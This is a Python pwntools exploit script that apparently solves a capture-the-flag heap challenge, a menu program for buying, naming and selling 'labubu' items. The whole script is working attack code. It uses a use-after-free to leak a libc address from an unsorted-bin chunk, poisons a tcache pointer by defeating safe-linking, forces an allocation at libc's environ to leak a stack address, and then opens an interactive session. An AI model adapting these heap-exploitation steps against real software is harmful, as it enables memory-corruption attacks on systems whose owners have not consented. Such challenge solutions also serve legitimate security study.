from pwn import *

context.binary = "./chal"
context.log_level = "info"

UNSORTED_OFFSET = 0x210b20  # (main_arena+0x60) - libc_base for this provided libc
ENVIRON_OFF     = 0x217e28  # from your readelf output

io = process("./chal")

def menu(c): io.sendlineafter(b"> ", str(c).encode())
def buy(i):  menu(1); io.sendlineafter(b"> ", str(i).encode())
def sell(i): menu(4); io.sendlineafter(b"> ", str(i).encode())
def name(i, data):
    menu(2)
    io.sendlineafter(b"> ", str(i).encode())
    io.sendafter(b"Name your labubu\n", data)
def admire(i):
    menu(3)
    io.sendlineafter(b"> ", str(i).encode())
    return io.recvn(0x400)

# -------------------------
# Step 1: libc leak (unsorted)
# -------------------------
for i in range(9):
    buy(i)

for i in range(7):
    sell(i)
sell(7)  # goes unsorted because tcache full AND idx8 is fence

leak = admire(7)
fd = u64(leak[:8])
libc_base = fd - UNSORTED_OFFSET
environ_addr = libc_base + ENVIRON_OFF

log.success(f"fd leak      = {hex(fd)}")
log.success(f"libc_base     = {hex(libc_base)}")
log.success(f"environ@libc   = {hex(environ_addr)}")

# -------------------------
# Step 2: make a tcache head chunk we can poison
# We want a single-chunk tcache bin where we know (chunk_addr >> 12)
# We'll use a fresh index 10.
# -------------------------
buy(10)
sell(10)

leak10 = admire(10)
chunk_shift = u64(leak10[:8])   # == chunk_addr >> 12 when real_fd == 0
log.info(f"chunk_shift = {hex(chunk_shift)}")

# Poison the freed chunk's fd so that:
# tcache_next = environ_addr
poison = p64(environ_addr ^ chunk_shift) + b"\n"
name(10, poison)

# Now malloc twice:
# 1st malloc returns the real chunk (idx10)
# 2nd malloc returns a "chunk" at environ
buy(11)
buy(12)

# Admire idx12: this will read starting at environ address
env_data = admire(12)
stack_ptr = u64(env_data[:8])
log.success(f"environ value (stack ptr) = {hex(stack_ptr)}")

io.interactive()
